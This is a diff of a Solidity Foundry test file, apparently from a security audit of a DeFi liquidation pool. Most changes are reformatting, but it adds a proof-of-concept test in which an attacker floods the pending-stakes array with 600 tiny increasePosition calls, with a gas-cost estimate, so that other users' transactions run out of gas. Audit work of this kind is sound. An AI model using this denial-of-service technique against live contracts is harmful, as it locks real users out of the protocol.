@@ -46,23 +46,11 @@ contract Unit is Common {
         /////   Checking if correct value has been deposited   /////
         ////////////////////////////////////////////////////////////
 
-        (LiquidationPool.Position memory alicePosition, ) = contracts
-            .liquidationPool
-            .position(alice);
-        (LiquidationPool.Position memory bobPosition, ) = contracts
-            .liquidationPool
-            .position(bob);
+        (LiquidationPool.Position memory alicePosition,) = contracts.liquidationPool.position(alice);
+        (LiquidationPool.Position memory bobPosition,) = contracts.liquidationPool.position(bob);
 
-        assertEq(
-            alicePosition.EUROs,
-            amount,
-            "Alice's euros amount are not eqaul"
-        );
-        assertEq(
-            alicePosition.TST,
-            amount,
-            "Alice's TSTs amount are not eqaul"
-        );
+        assertEq(alicePosition.EUROs, amount, "Alice's euros amount are not eqaul");
+        assertEq(alicePosition.TST, amount, "Alice's TSTs amount are not eqaul");
         assertEq(bobPosition.EUROs, amount, "Bob's euros amount are not eqaul");
         assertEq(bobPosition.TST, amount, "Bob's TSTs amount are not eqaul");
 
@@ -82,19 +70,13 @@ contract Unit is Common {
         ////////////////////////////////////
 
         address mike = makeAddr("mike");
-        (address mikesSmartVault, uint256 tokenIdMinted) = _createSmartVault(
-            mike
-        );
+        (address mikesSmartVault, uint256 tokenIdMinted) = _createSmartVault(mike);
 
         //////////////////////////////////////////////////////////
         ///     Checking If Mike is the owner of the vault     ///
         //////////////////////////////////////////////////////////
 
-        assertEq(
-            contracts.smartVaultManagerV5.ownerOf(tokenIdMinted),
-            mike,
-            "Mike is not the owner"
-        );
+        assertEq(contracts.smartVaultManagerV5.ownerOf(tokenIdMinted), mike, "Mike is not the owner");
 
         ////////////////////////////////////////////////////////
         ///     Mike deposits some tokens in the vault    //////
@@ -110,15 +92,9 @@ contract Unit is Common {
         ///     Checking if the correct balances has been transferred to the vault     ///
         //////////////////////////////////////////////////////////////////////////////////
 
-        uint256 mikePaxgBalanceInVault = tokens.paxgToken.balanceOf(
-            mikesSmartVault
-        );
+        uint256 mikePaxgBalanceInVault = tokens.paxgToken.balanceOf(mikesSmartVault);
 
-        assertEq(
-            mikePaxgAmount,
-            mikePaxgBalanceInVault,
-            "Balance is not equal"
-        );
+        assertEq(mikePaxgAmount, mikePaxgBalanceInVault, "Balance is not equal");
 
         /////////////////////////////////////////////////////////////////////////////////////////////
         ///     Mike decides to mint some euros from the vault that generates some fees           ///
@@ -143,16 +119,9 @@ contract Unit is Common {
         ///     There should be some euros fee in the liqudiationPoolManager    ///
         ///////////////////////////////////////////////////////////////////////////
 
-        uint256 feeGenerated = (eurosMikeWant * constants.PROTOCOL_FEE_RATE) /
-            100000;
-        uint256 eurosFeeInLiquidationManager = tokens.eurosToken.balanceOf(
-            address(contracts.liquidationPoolManager)
-        );
-        assertEq(
-            eurosFeeInLiquidationManager,
-            feeGenerated,
-            "fee is not equal"
-        );
+        uint256 feeGenerated = (eurosMikeWant * constants.PROTOCOL_FEE_RATE) / 100000;
+        uint256 eurosFeeInLiquidationManager = tokens.eurosToken.balanceOf(address(contracts.liquidationPoolManager));
+        assertEq(eurosFeeInLiquidationManager, feeGenerated, "fee is not equal");
         assertEq(eurosFeeInLiquidationManager, 2.5 ether, "fee is not equal");
 
         ///////////////////////////////////////////////////////////////////////////////////////////////////
@@ -174,22 +143,13 @@ contract Unit is Common {
         ///    Checking if the correct value has been deposited to the pool and bob's position   ///
         ////////////////////////////////////////////////////////////////////////////////////////////
 
-        (bobPosition, ) = contracts.liquidationPool.position(bob);
+        (bobPosition,) = contracts.liquidationPool.position(bob);
 
-        uint256 bobsFeeShare = (eurosFeeInLiquidationManager * (amount)) /
-            tokens.tstToken.totalSupply();
+        uint256 bobsFeeShare = (eurosFeeInLiquidationManager * (amount)) / tokens.tstToken.totalSupply();
 
-        assertEq(
-            bobPosition.EUROs,
-            amount * 2 + bobsFeeShare,
-            "Bob's euros amount are not eqaul"
-        );
+        assertEq(bobPosition.EUROs, amount * 2 + bobsFeeShare, "Bob's euros amount are not eqaul");
         assertEq(bobsFeeShare, 0.625 ether, "Bob's fee share is not equal");
-        assertEq(
-            bobPosition.TST,
-            amount * 2,
-            "Bob's TSTs amount are not eqaul"
-        );
+        assertEq(bobPosition.TST, amount * 2, "Bob's TSTs amount are not eqaul");
 
         ////////////////////////////////////////////////////////////////////////////////////////
         ///     Bob now holds 1000 TSTs and 1000.0625 euros in consolidated stakes          ////
@@ -206,10 +166,7 @@ contract Unit is Common {
         ///////////////////////////////////////////////////////////////////////
 
         vm.startPrank(bob);
-        contracts.liquidationPool.decreasePosition(
-            amount,
-            amount + 0.625 ether
-        );
+        contracts.liquidationPool.decreasePosition(amount, amount + 0.625 ether);
         vm.stopPrank();
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -218,7 +175,7 @@ contract Unit is Common {
         ///     Bob's pending stake = 1000 Tst and 1000 euros                        ///
         ////////////////////////////////////////////////////////////////////////////////
 
-        (bobPosition, ) = contracts.liquidationPool.position(bob);
+        (bobPosition,) = contracts.liquidationPool.position(bob);
 
         assertEq(bobPosition.EUROs, amount, "Bob's euros amount are not eqaul");
         assertEq(bobPosition.TST, amount, "Bob's euros amount are not eqaul");
@@ -251,15 +208,9 @@ contract Unit is Common {
         ///     Checking if correct fee is generated     ///
         ////////////////////////////////////////////////////
 
-        eurosFeeInLiquidationManager = tokens.eurosToken.balanceOf(
-            address(contracts.liquidationPoolManager)
-        );
+        eurosFeeInLiquidationManager = tokens.eurosToken.balanceOf(address(contracts.liquidationPoolManager));
 
-        assertEq(
-            eurosFeeInLiquidationManager,
-            feeGenerated,
-            "Balance is empty"
-        );
+        assertEq(eurosFeeInLiquidationManager, feeGenerated, "Balance is empty");
         assertEq(eurosFeeInLiquidationManager, 2.5 ether, "Balance is empty");
 
         /////////////////////////////////////////////////////
@@ -285,7 +236,7 @@ contract Unit is Common {
         ///     That means bob's position should be 0 TST and 0.625 euros             ///
         /////////////////////////////////////////////////////////////////////////////////
 
-        (bobPosition, ) = contracts.liquidationPool.position(bob);
+        (bobPosition,) = contracts.liquidationPool.position(bob);
 
         ///////////////////////////////////////////////////////////////////////////////////////////////////
         ///     But fee is not received since bob's address has been withdrawn from the holders array   ///
@@ -296,13 +247,117 @@ contract Unit is Common {
         assertEq(bobPosition.TST, 0);
     }
 
-    function _createSmartVault(
-        address _user
-    ) internal returns (address, uint256) {
+    // @audit test passed
+    function test_AttackerCanCauseDoSByMakingMultipleIncreasePostionCallAndFillingUpPendingStakes() public {
+        ////////////////////////////////////////////
+        ///                 Setup                ///
+        ////////////////////////////////////////////
+
+        uint256 pendingStakesLength = 600;
+        uint256 amount = 1000 ether;
+
+        /////////////////////////////////////////////////////////////////
+        //      minting some tokens to alice for the transaction      ///
+        /////////////////////////////////////////////////////////////////
+
+        tokens.eurosToken.mint(alice, amount);
+        tokens.tstToken.mint(alice, amount);
+
+        /////////////////////////////////////////////////////////////////
+        //      getting gas spent before the transaction              ///
+        /////////////////////////////////////////////////////////////////
+
+        uint256 gasBefore = gasleft();
+
+        /////////////////////////////////////////////////////////////////
+        //      alice stakes 600 times to fill up the pending array.  ///
+        //      by increasing his position by 1 wei of tokens value.  ///
+        //      The tx amount could be bigger as the protocol will    ///
+        //      be deployed on arbitrum and gas fee will be           ///
+        //      much cheaper as compared to ethereum.                 ///
+        /////////////////////////////////////////////////////////////////
+
+        vm.startPrank(alice);
+
+        for (uint256 i = 0; i < pendingStakesLength; i++) {
+
+            tokens.tstToken.approve(address(contracts.liquidationPool), 1);
+            tokens.eurosToken.approve(address(contracts.liquidationPool), 1);
+            contracts.liquidationPool.increasePosition(1, 1);
+        }
+
+        vm.stopPrank();
+
+
+        /////////////////////////////////////////////////////////////////
+        //      getting gas left after the transaction                ///
+        /////////////////////////////////////////////////////////////////
+
+        uint256 gasAfter = gasleft();
+
+        /////////////////////////////////////////////////////////////////
+        //      gas spent on the transaction                          ///
+        /////////////////////////////////////////////////////////////////
+
+        uint256 gasUsed = gasBefore - gasAfter;
+
+        ///////////////////////////////////////////////////////////////////////////////////////////////////
+        //      will be equal to 278253936. The amount will be very less if the transactions are        ///
+        //      sent individually. This amount of gas will be equal to approx 62.2287 USD on Arbitrum.  ///
+        //      calculated using this free tool:                                                        ///
+        //      https://www.cryptoneur.xyz/en/gas-fees-calculator?gas-input=8025143628&gas-price-opti   ///
+        ///////////////////////////////////////////////////////////////////////////////////////////////////
+        console2.log("gas used to add all pending stakes: %s", gasUsed);
+
+    
+        ///////////////////////////////////////////////////////////////////
+        //          skipping some time to consolidate stakes            ///
+        ///////////////////////////////////////////////////////////////////
+
+        skip(block.timestamp + 1 weeks);
+
+        ///////////////////////////////////////////////////////////////////
+        ///         Bob decides to increase his position.               ///
+        ///         This will cause the transaction to revert           ///
+        ///         due to out of Gas even if Max gas limit is set      ///
+        ///////////////////////////////////////////////////////////////////
+
+        tokens.eurosToken.mint(bob, amount);
+        tokens.tstToken.mint(bob, amount);
+
+        vm.startPrank(bob);
+        tokens.tstToken.approve(address(contracts.liquidationPool), 1000 ether);
+        tokens.eurosToken.approve(address(contracts.liquidationPool), 1000 ether);
+
+        // NOTE: This is just the max block gas limit that I picked from the internet. It can be high or low. Even if it is high, the attack can still happen as the attacker can increase the count of the transactions and we already know that it will be very cheap as it will be on arbitrum.
+        vm.expectRevert();
+        contracts.liquidationPool.increasePosition{gas: 30_000_000}(amount, amount);
+        vm.stopPrank();
+
+    }
+
+    // function just to calculate gas used to add pending stakes
+    function test_increasePositionOnce() public {
+        tokens.eurosToken.mint(alice, 1000 ether);
+        tokens.tstToken.mint(alice, 1000 ether);
+
+        // getting gas spent on the transaction
+        uint256 gasBefore = gasleft();
+        vm.startPrank(alice);
+        tokens.tstToken.approve(address(contracts.liquidationPool), 1000 ether);
+        tokens.eurosToken.approve(address(contracts.liquidationPool), 1000 ether);
+        contracts.liquidationPool.increasePosition(1000 ether, 1000 ether);
+        vm.stopPrank();
+        uint256 gasAfter = gasleft();
+
+        uint256 gasUsed = gasBefore - gasAfter;
+        console2.log("gas used to add one pending stake: %s", gasUsed);
+        console2.log("gas required to add 600 pending stakes: %s", gasUsed * 600);
+    }
+
+    function _createSmartVault(address _user) internal returns (address, uint256) {
         vm.prank(_user);
-        (address smartVault, uint256 tokenId) = contracts
-            .smartVaultManagerV5
-            .mint();
+        (address smartVault, uint256 tokenId) = contracts.smartVaultManagerV5.mint();
         vm.stopPrank();
         return (smartVault, tokenId);
     }
